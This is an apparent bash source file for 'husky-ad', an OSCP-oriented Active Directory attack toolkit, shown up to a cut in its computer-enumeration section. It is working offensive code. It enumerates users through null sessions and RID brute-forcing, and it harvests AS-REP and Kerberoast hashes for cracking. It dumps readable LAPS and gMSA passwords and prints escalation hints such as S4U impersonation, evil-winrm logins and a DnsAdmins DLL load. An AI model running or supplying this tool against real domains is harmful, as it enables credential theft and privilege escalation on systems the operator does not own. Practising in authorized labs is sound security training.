#!/bin/bash
#
# husky-ad — The Husky Hacker AD Enumeration & Escalation Toolkit
# OSCP-Friendly — No Metasploit, Kali-native tools only
#
# Built from real PG/Lab chains: hokkaido, Access-AD, Compromised-AD,
# Nagoya, Secura, Hutch, Lab A/B/C/D, Medtech
#
# Usage:
#   ./husky-ad.sh -d <domain> -c <dc_ip> -u <user> -p <pass>
#   ./husky-ad.sh -d <domain> -c <dc_ip> -u <user> -H <ntlm_hash>
#   ./husky-ad.sh -d <domain> -c <dc_ip>                          # null session
#
# Author: The Husky Hacker — github.com/HackingHusky
# Site:   thehuskyhacker.com

set -euo pipefail

# ═══════════════════════════════════════════════════════
# COLORS & FORMATTING
# ═══════════════════════════════════════════════════════
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
MAGENTA='\033[95m'
CYAN='\033[96m'
WHITE='\033[97m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

banner() {
    echo ""
    echo -e "${CYAN}    __  ____  _______ __ ____  __${NC}"
    echo -e "${CYAN}   / / / / / / / ___// //_/\\ \\ \\/ /${NC}"
    echo -e "${CYAN}  / /_/ / / / /\\__ \\/ ,<    \\  /${NC}"
    echo -e "${CYAN} / __  / /_/ /___/ / /| |   / /${NC}"
    echo -e "${CYAN}/_/ /_/\\____//____/_/ |_|  /_/${NC}"
    echo -e "${RED}    __  _____   ________ __ __________${NC}"
    echo -e "${RED}   / / / /   | / ____/ //_// ____/ __ \\${NC}"
    echo -e "${RED}  / /_/ / /| |/ /   / ,<  / __/ / /_/ /${NC}"
    echo -e "${RED} / __  / ___ / /___/ /| |/ /___/ _, _/${NC}"
    echo -e "${RED}/_/ /_/_/  |_\\____/_/ |_/_____/_/ |_|${NC}"
    echo ""
    echo -e "    ${BOLD}${WHITE}A D   E N U M   &   E S C A L A T I O N${NC}"
    echo -e "    ${CYAN}No Metasploit. No Excuses. Just Results.${NC}"
    echo -e "    ${CYAN}The Husky Hacker | thehuskyhacker.com${NC}"
    echo ""
}

section() {
    echo ""
    echo -e "${CYAN}  ╔═══════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}  ║${NC} ${BOLD}${WHITE} $1${NC}"
    echo -e "${CYAN}  ╚═══════════════════════════════════════════════════╝${NC}"
}

subsection() {
    echo ""
    echo -e "${BLUE}    ┌── $1 ──┐${NC}"
}

finding() {
    echo -e "  ${GREEN}[SNIFF]${NC} $1"
}

warning() {
    echo -e "  ${YELLOW}[GROWL]${NC} $1"
}

critical() {
    echo -e "  ${RED}[BITE!]${NC} ${BOLD}$1${NC}"
}

info() {
    echo -e "  ${CYAN}[TRACK]${NC} $1"
}

fail() {
    echo -e "  ${RED}[WHIFF]${NC} $1"
}

cmd_hint() {
    echo -e "  ${MAGENTA}     RUN:${NC} $1"
}

# ═══════════════════════════════════════════════════════
# ARGUMENT PARSING
# ═══════════════════════════════════════════════════════
DOMAIN=""
DC_IP=""
AD_USER=""
AD_PASS=""
AD_HASH=""
OUTPUT_DIR=""
BLOODHOUND=false
FULL_SCAN=false
QUIET=false

usage() {
    echo -e "${CYAN}${BOLD}husky-ad${NC} — The Husky Hacker AD Toolkit"
    echo ""
    echo "Usage: $0 -d <domain> -c <dc_ip> [-u <user>] [-p <pass>] [-H <hash>] [-o <outdir>] [-b] [-f]"
    echo ""
    echo "  -d    Domain name (e.g., corp.local)"
    echo "  -c    Domain Controller IP"
    echo "  -u    Username (optional — null session if omitted)"
    echo "  -p    Password"
    echo "  -H    NTLM hash (pass-the-hash)"
    echo "  -o    Output directory (default: ./husky_ad_loot)"
    echo "  -b    Run BloodHound collection"
    echo "  -f    Full scan — unleash the whole pack"
    echo "  -q    Quiet mode (findings only)"
    echo ""
    echo "Examples:"
    echo "  $0 -d corp.local -c 10.10.10.10 -u jsmith -p 'P@ssw0rd'"
    echo "  $0 -d corp.local -c 10.10.10.10 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:hash'"
    echo "  $0 -d corp.local -c 10.10.10.10                          # null session"
    exit 1
}

while getopts "d:c:u:p:H:o:bfqh" opt; do
    case $opt in
        d) DOMAIN="$OPTARG" ;;
        c) DC_IP="$OPTARG" ;;
        u) AD_USER="$OPTARG" ;;
        p) AD_PASS="$OPTARG" ;;
        H) AD_HASH="$OPTARG" ;;
        o) OUTPUT_DIR="$OPTARG" ;;
        b) BLOODHOUND=true ;;
        f) FULL_SCAN=true ;;
        q) QUIET=true ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [[ -z "$DOMAIN" || -z "$DC_IP" ]]; then
    echo -e "${RED}[!] Domain (-d) and DC IP (-c) are required${NC}"
    usage
fi

# Build base DN from domain
BASE_DN=""
IFS='.' read -ra DOMAIN_PARTS <<< "$DOMAIN"
for part in "${DOMAIN_PARTS[@]}"; do
    [[ -n "$BASE_DN" ]] && BASE_DN="${BASE_DN},"
    BASE_DN="${BASE_DN}DC=${part}"
done

# Output directory
OUTPUT_DIR="${OUTPUT_DIR:-./husky_ad_loot}"
mkdir -p "$OUTPUT_DIR"

# Auth mode
AUTH_MODE="null"
LDAP_AUTH=""
NXC_AUTH=""
RPC_AUTH="-N"
IMPACKET_AUTH=""

if [[ -n "$AD_USER" ]]; then
    if [[ -n "$AD_PASS" ]]; then
        AUTH_MODE="password"
        LDAP_AUTH="-D '${AD_USER}@${DOMAIN}' -w '${AD_PASS}'"
        NXC_AUTH="-u '${AD_USER}' -p '${AD_PASS}' -d '${DOMAIN}'"
        RPC_AUTH="-U '${AD_USER}%${AD_PASS}'"
        IMPACKET_AUTH="${DOMAIN}/${AD_USER}:${AD_PASS}"
    elif [[ -n "$AD_HASH" ]]; then
        AUTH_MODE="hash"
        NXC_AUTH="-u '${AD_USER}' -H '${AD_HASH}' -d '${DOMAIN}'"
        IMPACKET_AUTH="${DOMAIN}/${AD_USER} -hashes '${AD_HASH}'"
    else
        AUTH_MODE="null"
    fi
fi

# Track findings for summary
declare -a CRITICAL_FINDINGS=()
declare -a IMPORTANT_FINDINGS=()
declare -a QUICK_WINS=()

add_critical() { CRITICAL_FINDINGS+=("$1"); }
add_important() { IMPORTANT_FINDINGS+=("$1"); }
add_quickwin() { QUICK_WINS+=("$1"); }

# ═══════════════════════════════════════════════════════
# TOOL CHECKS
# ═══════════════════════════════════════════════════════
check_tools() {
    local missing=()
    local tools=(ldapsearch netexec rpcclient impacket-GetNPUsers impacket-GetUserSPNs
                 impacket-secretsdump impacket-lookupsid enum4linux-ng)

    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            missing+=("$tool")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        warning "Missing tools: ${missing[*]}"
        warning "Some checks will be skipped"
    fi

    # Optional tools
    if command -v bloodhound-python &>/dev/null; then
        info "bloodhound-python: available"
    else
        if $BLOODHOUND; then
            warning "bloodhound-python not found — skipping BloodHound collection"
            BLOODHOUND=false
        fi
    fi

    if command -v kerbrute &>/dev/null; then
        info "kerbrute: available"
    fi

    if command -v bloodyAD &>/dev/null; then
        info "bloodyAD: available"
    fi

    if command -v adidnsdump &>/dev/null; then
        info "adidnsdump: available"
    fi
}

# ═══════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════
run_ldap() {
    local filter="$1"
    local attrs="${2:-}"

    if [[ "$AUTH_MODE" == "password" ]]; then
        ldapsearch -x -H "ldap://${DC_IP}" -D "${AD_USER}@${DOMAIN}" -w "${AD_PASS}" \
            -b "${BASE_DN}" "$filter" $attrs 2>/dev/null
    elif [[ "$AUTH_MODE" == "null" ]]; then
        ldapsearch -x -H "ldap://${DC_IP}" -b "${BASE_DN}" "$filter" $attrs 2>/dev/null
    fi
}

run_nxc_smb() {
    local extra_args="$*"
    if [[ "$AUTH_MODE" == "password" ]]; then
        netexec smb "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" $extra_args 2>/dev/null
    elif [[ "$AUTH_MODE" == "hash" ]]; then
        netexec smb "$DC_IP" -u "$AD_USER" -H "$AD_HASH" -d "$DOMAIN" $extra_args 2>/dev/null
    elif [[ "$AUTH_MODE" == "null" ]]; then
        netexec smb "$DC_IP" -u '' -p '' $extra_args 2>/dev/null
    fi
}

run_nxc_ldap() {
    local extra_args="$*"
    if [[ "$AUTH_MODE" == "password" ]]; then
        netexec ldap "$DC_IP" -u "$AD_USER" -p "$AD_PASS" -d "$DOMAIN" $extra_args 2>/dev/null
    elif [[ "$AUTH_MODE" == "hash" ]]; then
        netexec ldap "$DC_IP" -u "$AD_USER" -H "$AD_HASH" -d "$DOMAIN" $extra_args 2>/dev/null
    fi
}

run_rpcclient() {
    local cmd="$1"
    if [[ "$AUTH_MODE" == "password" ]]; then
        rpcclient -U "${AD_USER}%${AD_PASS}" "$DC_IP" -c "$cmd" 2>/dev/null
    elif [[ "$AUTH_MODE" == "null" ]]; then
        rpcclient -U '' -N "$DC_IP" -c "$cmd" 2>/dev/null
    fi
}

# ═══════════════════════════════════════════════════════
# START
# ═══════════════════════════════════════════════════════
banner

echo -e "${WHITE}${BOLD}  Hunting Ground:${NC}  $DOMAIN ($DC_IP)"
echo -e "${WHITE}${BOLD}  Auth Mode:${NC}      $AUTH_MODE"
[[ -n "$AD_USER" ]] && echo -e "${WHITE}${BOLD}  Identity:${NC}       $AD_USER"
echo -e "${WHITE}${BOLD}  Loot Drop:${NC}      $OUTPUT_DIR"
echo -e "${WHITE}${BOLD}  Hunt Started:${NC}   $(date)"
echo ""

check_tools

# ═══════════════════════════════════════════════════════
# 1. DOMAIN INFORMATION
# ═══════════════════════════════════════════════════════
section "1. SNIFFING THE TERRITORY — Domain Info"

subsection "Basic Domain Info"

# SMB signing & OS info
SMB_INFO=$(run_nxc_smb 2>/dev/null || true)
if [[ -n "$SMB_INFO" ]]; then
    echo "$SMB_INFO" | while read -r line; do
        info "$line"
    done
    echo "$SMB_INFO" > "$OUTPUT_DIR/smb_info.txt"

    if echo "$SMB_INFO" | grep -qi "signing:False"; then
        critical "SMB SIGNING DISABLED — relay attacks possible!"
        add_critical "SMB signing disabled on DC — NTLM relay possible"
    fi
fi

# LDAP naming contexts
subsection "LDAP Naming Contexts"
NAMING=$(ldapsearch -x -H "ldap://${DC_IP}" -b '' -s base namingContexts 2>/dev/null || true)
if [[ -n "$NAMING" ]]; then
    echo "$NAMING" | grep "namingContexts:" | while read -r line; do
        info "$line"
    done
    echo "$NAMING" > "$OUTPUT_DIR/naming_contexts.txt"
    finding "LDAP is accessible"
else
    fail "LDAP not accessible or filtered"
fi

# Null session check
subsection "Null Session Check"
NULL_USERS=$(rpcclient -U '' -N "$DC_IP" -c 'enumdomusers' 2>/dev/null || true)
if [[ -n "$NULL_USERS" ]] && ! echo "$NULL_USERS" | grep -qi "denied\|error\|STATUS_ACCESS"; then
    critical "NULL SESSION ALLOWED — can enumerate users without creds!"
    echo "$NULL_USERS" > "$OUTPUT_DIR/null_session_users.txt"
    add_critical "Null session on RPC — full user enumeration without credentials"
    add_quickwin "Null session → enumerate users → AS-REP roast → password spray"
fi

NULL_SMB=$(smbclient -N -L "//${DC_IP}/" 2>/dev/null || true)
if [[ -n "$NULL_SMB" ]] && ! echo "$NULL_SMB" | grep -qi "denied\|error\|LOGON_FAILURE"; then
    warning "Anonymous SMB listing possible"
    echo "$NULL_SMB" > "$OUTPUT_DIR/null_smb_shares.txt"
fi

# ═══════════════════════════════════════════════════════
# 2. USER ENUMERATION
# ═══════════════════════════════════════════════════════
section "2. TRACKING THE PACK — User Enumeration"

subsection "Domain Users"

# RID brute for all users
if [[ "$AUTH_MODE" != "null" ]] || [[ -n "$NULL_USERS" ]]; then
    RID_BRUTE=$(run_nxc_smb "--rid-brute 5000" 2>/dev/null || true)
    if [[ -n "$RID_BRUTE" ]]; then
        # Extract just usernames
        echo "$RID_BRUTE" | grep "SidTypeUser" | tee "$OUTPUT_DIR/rid_brute_users.txt" | while read -r line; do
            info "$line"
        done

        # Save clean username list
        echo "$RID_BRUTE" | grep "SidTypeUser" | awk -F'\\\\' '{print $2}' | awk '{print $1}' | \
            sed 's/(SidTypeUser)//g' | sort -u > "$OUTPUT_DIR/users.txt"

        USER_COUNT=$(wc -l < "$OUTPUT_DIR/users.txt" 2>/dev/null || echo "0")
        finding "Found $USER_COUNT domain users — saved to $OUTPUT_DIR/users.txt"
    fi
fi

# LDAP user dump with descriptions
subsection "User Descriptions (Password Hunting)"
if [[ "$AUTH_MODE" == "password" ]]; then
    DESC_RESULTS=$(run_ldap '(&(objectClass=user)(description=*))' 'sAMAccountName description' 2>/dev/null || true)
    if [[ -n "$DESC_RESULTS" ]]; then
        echo "$DESC_RESULTS" > "$OUTPUT_DIR/user_descriptions.txt"

        # Check for password-like content in descriptions
        PASS_DESCS=$(echo "$DESC_RESULTS" | grep -iE 'description:.*pass|description:.*pwd|description:.*cred|description:.*secret|description:.*temp' || true)
        if [[ -n "$PASS_DESCS" ]]; then
            critical "PASSWORDS FOUND IN USER DESCRIPTIONS!"
            echo "$PASS_DESCS" | while read -r line; do
                critical "  $line"
            done
            add_critical "Password(s) in user description field"
            add_quickwin "Description passwords → test with netexec smb/winrm spray"
        else
            info "No obvious passwords in descriptions"
        fi

        # Show all descriptions for manual review
        info "All descriptions saved to $OUTPUT_DIR/user_descriptions.txt"
    fi
fi

# Disabled accounts
subsection "Account Status"
if [[ "$AUTH_MODE" == "password" ]]; then
    # Enabled users
    ENABLED=$(run_ldap '(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' 'sAMAccountName' 2>/dev/null || true)
    ENABLED_COUNT=$(echo "$ENABLED" | grep -c "sAMAccountName:" 2>/dev/null || echo "0")
    info "Enabled accounts: $ENABLED_COUNT"

    # Admin count flagged
    ADMIN_COUNT_USERS=$(run_ldap '(&(objectClass=user)(adminCount=1))' 'sAMAccountName' 2>/dev/null || true)
    if [[ -n "$ADMIN_COUNT_USERS" ]]; then
        echo "$ADMIN_COUNT_USERS" | grep "sAMAccountName:" | while read -r line; do
            warning "AdminCount=1: $line"
        done
        echo "$ADMIN_COUNT_USERS" > "$OUTPUT_DIR/admincount_users.txt"
    fi
fi

# ═══════════════════════════════════════════════════════
# 3. PASSWORD POLICY
# ═══════════════════════════════════════════════════════
section "3. TESTING THE FENCE — Password Policy"

PW_POLICY=$(run_rpcclient 'getdompwinfo' 2>/dev/null || true)
if [[ -n "$PW_POLICY" ]] && ! echo "$PW_POLICY" | grep -qi "denied\|error"; then
    echo "$PW_POLICY" | while read -r line; do
        info "$line"
    done
    echo "$PW_POLICY" > "$OUTPUT_DIR/password_policy.txt"

    # Check for weak policy
    MIN_LEN=$(echo "$PW_POLICY" | grep -i "min_password_length" | awk '{print $NF}' || true)
    if [[ -n "$MIN_LEN" ]] && [[ "$MIN_LEN" -lt 8 ]]; then
        warning "Weak password policy — minimum length: $MIN_LEN"
        add_important "Weak password policy (min length: $MIN_LEN)"
    fi

    LOCKOUT=$(run_rpcclient 'querydominfo' 2>/dev/null | grep -i "lockout" || true)
    if [[ -n "$LOCKOUT" ]]; then
        info "Lockout info: $LOCKOUT"
    fi
else
    # Try netexec
    NXC_POLICY=$(run_nxc_smb "--pass-pol" 2>/dev/null || true)
    if [[ -n "$NXC_POLICY" ]]; then
        echo "$NXC_POLICY" | while read -r line; do
            info "$line"
        done
    else
        fail "Cannot retrieve password policy"
    fi
fi

# ═══════════════════════════════════════════════════════
# 4. KERBEROS ATTACKS
# ═══════════════════════════════════════════════════════
section "4. CRACKING BONES — Kerberos Attacks"

# AS-REP Roasting
subsection "AS-REP Roasting (No Preauth Users)"

if command -v impacket-GetNPUsers &>/dev/null; then
    ASREP_OUT="$OUTPUT_DIR/asrep_hashes.txt"

    if [[ "$AUTH_MODE" == "password" ]]; then
        ASREP=$(impacket-GetNPUsers "${DOMAIN}/${AD_USER}:${AD_PASS}" -dc-ip "$DC_IP" -request 2>/dev/null || true)
    elif [[ -f "$OUTPUT_DIR/users.txt" ]]; then
        ASREP=$(impacket-GetNPUsers "${DOMAIN}/" -usersfile "$OUTPUT_DIR/users.txt" -no-pass -dc-ip "$DC_IP" 2>/dev/null || true)
    else
        ASREP=$(impacket-GetNPUsers "${DOMAIN}/" -no-pass -dc-ip "$DC_IP" 2>/dev/null || true)
    fi

    if [[ -n "$ASREP" ]]; then
        ASREP_HASHES=$(echo "$ASREP" | grep '^\$krb5asrep' || true)
        if [[ -n "$ASREP_HASHES" ]]; then
            critical "AS-REP ROASTABLE USERS FOUND!"
            echo "$ASREP_HASHES" | tee "$ASREP_OUT" | while read -r hash; do
                # Extract username from hash
                ASREP_USER=$(echo "$hash" | cut -d'$' -f4 | cut -d':' -f1 | cut -d'@' -f1)
                critical "  Roastable: $ASREP_USER"
            done
            ASREP_COUNT=$(echo "$ASREP_HASHES" | wc -l)
            add_critical "AS-REP roastable users found: $ASREP_COUNT"
            add_quickwin "AS-REP hashes → hashcat -m 18200 $ASREP_OUT rockyou.txt"
            cmd_hint "hashcat -m 18200 $ASREP_OUT /usr/share/wordlists/rockyou.txt"
        else
            info "No AS-REP roastable users found"
        fi
    fi
else
    fail "impacket-GetNPUsers not found — skipping AS-REP roast"
fi

# Kerberoasting
subsection "Kerberoasting (Service Accounts with SPNs)"

if [[ "$AUTH_MODE" != "null" ]] && command -v impacket-GetUserSPNs &>/dev/null; then
    KERB_OUT="$OUTPUT_DIR/kerberoast_hashes.txt"

    if [[ "$AUTH_MODE" == "password" ]]; then
        KERB=$(impacket-GetUserSPNs "${DOMAIN}/${AD_USER}:${AD_PASS}" -dc-ip "$DC_IP" -request -outputfile "$KERB_OUT" 2>/dev/null || true)
    elif [[ "$AUTH_MODE" == "hash" ]]; then
        KERB=$(impacket-GetUserSPNs "${DOMAIN}/${AD_USER}" -hashes "${AD_HASH}" -dc-ip "$DC_IP" -request -outputfile "$KERB_OUT" 2>/dev/null || true)
    fi

    if [[ -n "$KERB" ]]; then
        # Show SPN accounts
        echo "$KERB" | grep -E "^\w" | grep -v "^Impacket\|^ServicePrincipal\|^-" | while read -r line; do
            warning "SPN Account: $line"
        done

        if [[ -f "$KERB_OUT" ]] && [[ -s "$KERB_OUT" ]]; then
            KERB_COUNT=$(wc -l < "$KERB_OUT")
            critical "KERBEROASTABLE ACCOUNTS: $KERB_COUNT — hashes saved!"
            add_critical "Kerberoastable service accounts found: $KERB_COUNT"
            add_quickwin "Kerberoast hashes → hashcat -m 13100 $KERB_OUT rockyou.txt"
            cmd_hint "hashcat -m 13100 $KERB_OUT /usr/share/wordlists/rockyou.txt"
        else
            info "No Kerberoastable accounts or hashes returned"
        fi
    fi
else
    [[ "$AUTH_MODE" == "null" ]] && info "Need credentials for Kerberoasting"
fi

# ═══════════════════════════════════════════════════════
# 5. SMB SHARES
# ═══════════════════════════════════════════════════════
section "5. RAIDING THE DEN — SMB Shares"

subsection "Share Enumeration"
SHARES=$(run_nxc_smb "--shares" 2>/dev/null || true)
if [[ -n "$SHARES" ]]; then
    echo "$SHARES" | tee "$OUTPUT_DIR/smb_shares.txt" | while read -r line; do
        if echo "$line" | grep -qi "READ\|WRITE"; then
            if echo "$line" | grep -qi "WRITE"; then
                warning "WRITABLE: $line"
            else
                info "$line"
            fi
        fi
    done

    # Check for interesting writable shares
    WRITABLE=$(echo "$SHARES" | grep -i "WRITE" || true)
    if [[ -n "$WRITABLE" ]]; then
        add_important "Writable SMB shares found — check for config files, scripts, web roots"
    fi
fi

# Spider shares for interesting files
if [[ "$AUTH_MODE" != "null" ]] && $FULL_SCAN; then
    subsection "Share Spider (looking for juicy files)"
    SPIDER=$(run_nxc_smb "-M spider_plus" 2>/dev/null || true)
    if [[ -n "$SPIDER" ]]; then
        echo "$SPIDER" > "$OUTPUT_DIR/share_spider.txt"
        info "Spider results saved to $OUTPUT_DIR/share_spider.txt"
    fi
fi

# ═══════════════════════════════════════════════════════
# 6. ACL ABUSE PATHS
# ═══════════════════════════════════════════════════════
section "6. FINDING THE WEAK LINK — ACL & Privileges"

if [[ "$AUTH_MODE" == "password" ]]; then

    # GenericAll on users
    subsection "Dangerous ACLs (LDAP Queries)"

    # Users with "Do not require preauth" — different from AS-REP check, this shows ALL
    NO_PREAUTH=$(run_ldap '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' 'sAMAccountName' 2>/dev/null || true)
    if [[ -n "$NO_PREAUTH" ]] && echo "$NO_PREAUTH" | grep -q "sAMAccountName:"; then
        warning "Users with 'Do not require Kerberos preauthentication':"
        echo "$NO_PREAUTH" | grep "sAMAccountName:" | while read -r line; do
            warning "  $line"
        done
    fi

    # Unconstrained delegation
    subsection "Delegation"

    UNCONST=$(run_ldap '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' 'sAMAccountName dNSHostName' 2>/dev/null || true)
    if [[ -n "$UNCONST" ]] && echo "$UNCONST" | grep -q "sAMAccountName:"; then
        critical "UNCONSTRAINED DELEGATION found!"
        echo "$UNCONST" | grep "sAMAccountName:\|dNSHostName:" | while read -r line; do
            critical "  $line"
        done
        add_critical "Unconstrained delegation on computer objects"
    fi

    # Constrained delegation
    CONST=$(run_ldap '(&(objectClass=*)(msDS-AllowedToDelegateTo=*))' 'sAMAccountName msDS-AllowedToDelegateTo' 2>/dev/null || true)
    if [[ -n "$CONST" ]] && echo "$CONST" | grep -q "sAMAccountName:"; then
        warning "Constrained Delegation found:"
        echo "$CONST" | grep "sAMAccountName:\|msDS-AllowedToDelegateTo:" | while read -r line; do
            warning "  $line"
        done
        echo "$CONST" > "$OUTPUT_DIR/constrained_delegation.txt"
        add_important "Constrained delegation — S4U impersonation possible"
        cmd_hint "impacket-getST -spn 'cifs/TARGET' -impersonate Administrator '${DOMAIN}/svc:pass' -dc-ip $DC_IP"
    fi

    # RBCD — msDS-AllowedToActOnBehalfOfOtherIdentity
    RBCD=$(run_ldap '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' 'sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity' 2>/dev/null || true)
    if [[ -n "$RBCD" ]] && echo "$RBCD" | grep -q "sAMAccountName:"; then
        warning "Resource-Based Constrained Delegation configured:"
        echo "$RBCD" | grep "sAMAccountName:" | while read -r line; do
            warning "  $line"
        done
        add_important "RBCD configured on computer objects"
    fi

    # Check for machine account quota (for RBCD attacks)
    MAQ=$(run_ldap '(objectClass=domain)' 'ms-DS-MachineAccountQuota' 2>/dev/null || true)
    MAQ_VAL=$(echo "$MAQ" | grep "ms-DS-MachineAccountQuota:" | awk '{print $2}' || true)
    if [[ -n "$MAQ_VAL" ]] && [[ "$MAQ_VAL" -gt 0 ]]; then
        warning "MachineAccountQuota: $MAQ_VAL (can create computer accounts for RBCD)"
        add_important "MachineAccountQuota=$MAQ_VAL — RBCD attack possible if GenericWrite on computer"
    elif [[ "$MAQ_VAL" == "0" ]]; then
        info "MachineAccountQuota: 0 (RBCD via new machine account blocked)"
    fi

fi

# ═══════════════════════════════════════════════════════
# 7. LAPS
# ═══════════════════════════════════════════════════════
section "7. DIGGING UP BONES — LAPS Passwords"

if [[ "$AUTH_MODE" == "password" ]]; then
    # Check if LAPS is deployed
    LAPS_SCHEMA=$(run_ldap '(attributeTypes=*ms-Mcs-AdmPwd*)' '' 2>/dev/null | head -5 || true)

    # Try to read LAPS passwords
    LAPS_READ=$(run_ldap '(ms-MCS-AdmPwd=*)' 'sAMAccountName ms-MCS-AdmPwd' 2>/dev/null || true)
    if [[ -n "$LAPS_READ" ]] && echo "$LAPS_READ" | grep -q "ms-MCS-AdmPwd:"; then
        critical "LAPS PASSWORDS READABLE!"
        echo "$LAPS_READ" | grep "sAMAccountName:\|ms-MCS-AdmPwd:" | while read -r line; do
            critical "  $line"
        done
        echo "$LAPS_READ" > "$OUTPUT_DIR/laps_passwords.txt"
        add_critical "LAPS passwords readable — local admin on those computers"
        add_quickwin "LAPS password → evil-winrm/psexec as local Administrator"
    else
        # Check via bloodyAD
        if command -v bloodyAD &>/dev/null; then
            LAPS_BLOODY=$(bloodyAD -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --host "$DC_IP" \
                get children "OU=Domain Controllers,${BASE_DN}" --attr ms-MCS-AdmPwd 2>/dev/null || true)
            if [[ -n "$LAPS_BLOODY" ]] && echo "$LAPS_BLOODY" | grep -qi "ms-MCS-AdmPwd"; then
                critical "LAPS password found via bloodyAD!"
                echo "$LAPS_BLOODY"
            fi
        fi
        info "No LAPS passwords readable with current privileges (or LAPS not deployed)"
    fi

    # Windows LAPS (new version)
    LAPS_NEW=$(run_ldap '(msLAPS-Password=*)' 'sAMAccountName msLAPS-Password' 2>/dev/null || true)
    if [[ -n "$LAPS_NEW" ]] && echo "$LAPS_NEW" | grep -q "msLAPS-Password:"; then
        critical "WINDOWS LAPS (v2) PASSWORDS READABLE!"
        echo "$LAPS_NEW" | grep "sAMAccountName:\|msLAPS-Password:" | while read -r line; do
            critical "  $line"
        done
        add_critical "Windows LAPS v2 passwords readable"
    fi
fi

# ═══════════════════════════════════════════════════════
# 8. GMSA (Group Managed Service Accounts)
# ═══════════════════════════════════════════════════════
section "8. BURIED TREASURE — GMSA Accounts"

if [[ "$AUTH_MODE" == "password" ]]; then
    GMSA=$(run_ldap '(objectClass=msDS-GroupManagedServiceAccount)' 'sAMAccountName msDS-GroupMSAMembership' 2>/dev/null || true)
    if [[ -n "$GMSA" ]] && echo "$GMSA" | grep -q "sAMAccountName:"; then
        warning "GMSA accounts found:"
        echo "$GMSA" | grep "sAMAccountName:" | while read -r line; do
            warning "  $line"
        done
        echo "$GMSA" > "$OUTPUT_DIR/gmsa_accounts.txt"

        # Try to read GMSA password
        if command -v bloodyAD &>/dev/null; then
            echo "$GMSA" | grep "sAMAccountName:" | awk '{print $2}' | while read -r gmsa_name; do
                GMSA_PASS=$(bloodyAD -d "$DOMAIN" -u "$AD_USER" -p "$AD_PASS" --host "$DC_IP" \
                    get object "${gmsa_name}" --attr msDS-ManagedPassword 2>/dev/null || true)
                if [[ -n "$GMSA_PASS" ]] && ! echo "$GMSA_PASS" | grep -qi "error\|denied"; then
                    critical "GMSA PASSWORD READABLE: $gmsa_name"
                    echo "$GMSA_PASS"
                    add_critical "GMSA password readable for $gmsa_name"
                    add_quickwin "GMSA hash → evil-winrm -u '${gmsa_name}\$' -H hash"
                fi
            done
        fi

        add_important "GMSA accounts exist — check if current user can read msDS-ManagedPassword"
    else
        info "No GMSA accounts found"
    fi
fi

# ═══════════════════════════════════════════════════════
# 9. GROUP MEMBERSHIPS
# ═══════════════════════════════════════════════════════
section "9. THE ALPHA DOGS — Privileged Groups"

PRIV_GROUPS=(
    "Domain Admins"
    "Enterprise Admins"
    "Administrators"
    "Account Operators"
    "Server Operators"
    "Backup Operators"
    "DnsAdmins"
    "Exchange Windows Permissions"
    "Remote Desktop Users"
    "Remote Management Users"
)

for group in "${PRIV_GROUPS[@]}"; do
    MEMBERS=$(run_rpcclient "enumalsgroups builtin" 2>/dev/null || true)
    # Use LDAP for reliable group membership
    GROUP_MEMBERS=$(run_ldap "(&(objectClass=user)(memberOf=CN=${group},CN=Users,${BASE_DN}))" 'sAMAccountName' 2>/dev/null || true)

    # Also check under Builtin container
    if [[ -z "$GROUP_MEMBERS" ]] || ! echo "$GROUP_MEMBERS" | grep -q "sAMAccountName:"; then
        GROUP_MEMBERS=$(run_ldap "(&(objectClass=user)(memberOf=CN=${group},CN=Builtin,${BASE_DN}))" 'sAMAccountName' 2>/dev/null || true)
    fi

    if [[ -n "$GROUP_MEMBERS" ]] && echo "$GROUP_MEMBERS" | grep -q "sAMAccountName:"; then
        finding "$group:"
        echo "$GROUP_MEMBERS" | grep "sAMAccountName:" | while read -r line; do
            echo -e "      $line"
        done
    fi
done

# Check if our user is in any privileged group
if [[ -n "$AD_USER" ]]; then
    subsection "Current User's Groups"
    MY_GROUPS=$(run_ldap "(sAMAccountName=${AD_USER})" 'memberOf' 2>/dev/null || true)
    if [[ -n "$MY_GROUPS" ]]; then
        echo "$MY_GROUPS" | grep "memberOf:" | while read -r line; do
            GROUP_NAME=$(echo "$line" | sed 's/memberOf: CN=//;s/,.*//')
            info "Member of: $GROUP_NAME"

            # Check for escalation paths
            case "$GROUP_NAME" in
                "DnsAdmins")
                    critical "DnsAdmins member — DLL injection → SYSTEM on DC!"
                    add_critical "User in DnsAdmins → dnscmd DLL load → SYSTEM"
                    add_quickwin "DnsAdmins → msfvenom DLL + dnscmd /config /serverlevelplugindll"
                    ;;
                "Backup Operators")
                    critical "Backup Operators — can dump SAM/SYSTEM!"
                    add_critical "User in Backup Operators → backup SAM/SYSTEM/NTDS"
                    ;;
                "Server Operators")
                    critical "Server Operators — can modify services!"
                    add_critical "User in Server Operators → service binary hijack → SYSTEM"
                    ;;
                "Account Operators")
                    warning "Account Operators — can create/modify accounts!"
                    add_important "Account Operators — can create users and modify group membership"
                    ;;
                "Remote Management Users")
                    finding "Remote Management Users — WinRM access"
                    cmd_hint "evil-winrm -i $DC_IP -u '$AD_USER' -p '$AD_PASS'"
                    ;;
            esac
        done
    fi
fi

# ═══════════════════════════════════════════════════════
# 10. COMPUTER OBJECTS
# ═══════════════════════════════════════════════════════
section "10. MAPPING THE TERRITORY — Computers"

if [[ "$AUTH_MODE" == "password" ]]; then
    COMPUTERS=$(run_ldap '(objectClass=computer)' 'sAMAccountName dNSHostName operatingSystem' 2>/dev/null || true)
    if [[ -n "$COMPUTERS" ]]; then
        echo "$COMPUTERS" > "$OUTPUT_DIR/computers.txt"

        # Count and list
        COMP_COUNT=$(echo "$COMPUTERS" | grep -c "sAMAccountName:" 2>/dev/null || echo "0")
        info "Domain computers: $COMP_COUNT"

